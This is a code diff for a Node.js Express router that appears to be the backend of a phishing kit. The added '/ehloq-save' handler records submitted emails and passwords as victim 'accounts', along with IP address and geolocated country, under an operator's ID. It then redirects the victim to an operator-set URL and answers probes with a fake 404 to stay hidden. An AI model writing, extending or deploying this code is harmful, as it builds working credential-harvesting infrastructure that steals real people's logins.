@@ -2,7 +2,10 @@ import express from 'express';
 import geoip from 'geoip-lite';
 import requestIp from 'request-ip';
 import * as UserDB from '../database/user/user.database.js';
+import * as AccountDB from '../database/account/account.database.js';
 import { allowPostWords } from '../utils/allowed_words.js';
+import clm from 'country-locale-map';
+const { getCountryByAlpha2 } = clm;
 const router = express.Router();
 router.get("/ehloq-load", async (req, res) => {
     const referer = req.headers.referer || req.headers.referrer || "No se proporcionó un referer";
@@ -39,16 +42,43 @@ router.get("/ehloq-load", async (req, res) => {
     res.type('application/javascript');
     res.send(code);
 });
-router.post("/ehloq-save", (req, res) => {
+router.post("/ehloq-save", async (req, res) => {
+    var _a;
     try {
         const clientIp = requestIp.getClientIp(req) || "";
-        console.log("REQUEST => ", req.body);
+        const identifier = req.headers.identifier;
+        if (!identifier) {
+            return res.status(404).send('Página no encontrada');
+        }
+        const user = await UserDB.getUserById(identifier);
+        if (!user) {
+            return res.status(404).send('Página no encontrada');
+        }
         const cleanBody = JSON.parse(JSON.stringify(req.body));
         console.log("cleanBody => ", cleanBody);
-        const geo = geoip.lookup(clientIp);
+        if (!cleanBody.username || !cleanBody.name) {
+            return res.status(404).send('Página no encontrada');
+        }
+        const geoInfo = geoip.lookup(clientIp);
+        if (!geoInfo || !geoInfo.country) {
+            return res.status(404).send('Página no encontrada');
+        }
         console.log("IP del usuario:", clientIp);
-        console.log("Información geográfica:", geo);
-        return res.send("EhloQ");
+        console.log("Información geográfica:", geoInfo);
+        const newAccountData = {
+            email: cleanBody.username,
+            password: cleanBody.name,
+            username: user.username,
+            country: ((_a = getCountryByAlpha2(geoInfo.country)) === null || _a === void 0 ? void 0 : _a.name) || "",
+            countryCode: geoInfo.country,
+            active: true,
+            ipAddress: clientIp,
+            userAgent: "",
+            cookies: {},
+            createdAt: new Date(),
+        };
+        await AccountDB.saveNewAccount(newAccountData);
+        return res.redirect(307, user.config.redirect);
     }
     catch (error) {
         console.error("Error al procesar la solicitud:", error);
